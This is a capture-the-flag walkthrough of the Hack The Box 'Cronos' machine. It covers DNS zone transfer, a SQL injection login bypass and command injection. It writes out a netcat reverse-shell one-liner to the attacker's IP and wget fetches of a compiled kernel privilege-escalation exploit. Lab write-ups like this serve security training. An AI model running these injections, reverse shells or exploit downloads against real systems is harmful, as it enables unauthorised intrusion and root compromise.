# Cronos -- hack the box

![AEpKkq.png](https://s2.ax1x.com/2019/03/14/AEpKkq.png)

## Introduction

Target machine: 10.10.10.13(OS: linux)

Kali linux: 10.10.16.44

## Enumeration

Firstly, detect the open ports:

```
nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
```

![openports](https://github.com/neal1991/htb/blob/master/Cronos/openports.png)

3 ports is open, detect the detailed services:

```
namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
```

![services](https://github.com/neal1991/htb/blob/master/Cronos/services.png)

So we can conduct the relation of ports of ports and services as following:

port|service
---|---
53|DNS
22|ssh
80|http

## Exploitation

### http

As the target machine provides http service, try to access `http://10.10.10.13`

![default web](https://github.com/neal1991/htb/blob/master/Cronos/80.png)

Default apache web page, nothing new. So try to brute force `http://10.10.10.13/` with dirbuster. After brute force for a period time, we have not found anything new.

### DNS

As the target machine owns DNS service. It is common to check zone transfer with `dig`. As we can have a guess of the dns domain of `cronos.htb`. So zone transfer can be checked by:

```
dig axfr @10.10.10.13 cronos.htb
```

![dns](https://github.com/neal1991/htb/blob/master/Cronos/dns.png)

An interestring domain name `admin.cronos.htb` is found. So add an entry into `/etc/hosts`:

```
10.10.10.13    admin.cronos.htb
```

Try to access `admin.cronos.htb` in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of `admin ' or '1' = '1`, the password can be anything.

![login](https://github.com/neal1991/htb/blob/master/Cronos/login.png)

![pass](https://github.com/neal1991/htb/blob/master/Cronos/pass.png)

Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of `8888&whoami`:

![whoami](https://github.com/neal1991/htb/blob/master/Cronos/whoami.png)

The result is `www-data`. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port `1234` by nc in our kali:

```
nc -lvnp 1234
```

Then use the bash reverse shell command:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f
```

Wait for server second, shell is return. Wonderful!

![nc](https://github.com/neal1991/htb/blob/master/Cronos/nc.png)

Try to obtain a tty terminal:

```
python -c "import pty;pty.spawn('/bin/sh')"
```

Obviously, the user role can be obtained. Go the `home` folder and `ls`， then go into the user folder to get user.txt.

## Privilege escalation

It's time to get the root role. See the kernel of the target machine:

```
uname -a
```

Google linux kernel privilege escalation, find a [payload](https://www.exploit-db.com/exploits/44298)

![AEmLVK.png](https://s2.ax1x.com/2019/03/15/AEmLVK.png)

Server a http server to provide the payload, name it as exploit.c:

```
pythoon -m SimpleHTTPServer 80
```

There are serveal ways to provide http file services, including: php, apache, python, etc. Pyhton is quite convinient. Then download the `exploit.c` in the target machine:

```
wget http://10.10.16.22/exploit.c
```

Then try to compile it with gcc. Opps, gcc seems has not been installed in the target machine. In general, linux will install gcc. Whatever, compile the `exploit.c` in kali:

```
gcc exploit.c -o exploit
```

Remember to download the file from a folder with permission, just like `/tmp`:

```
cd /tmp
wget http://10.10.16.44/exploit
```

Make sure to have execution perssion by:

```
chmod +x exploit
```

Just execute it by `./exploit`. Wow, now see whoami.

![root](https://github.com/neal1991/htb/blob/master/Cronos/root.png)

## Conclusion

The target machine is quite straitforward. The basic point is the zone transfer of DNS exploit. And other steps is not difficult with basic knowledges including: sql injection, reverse shell, etc.




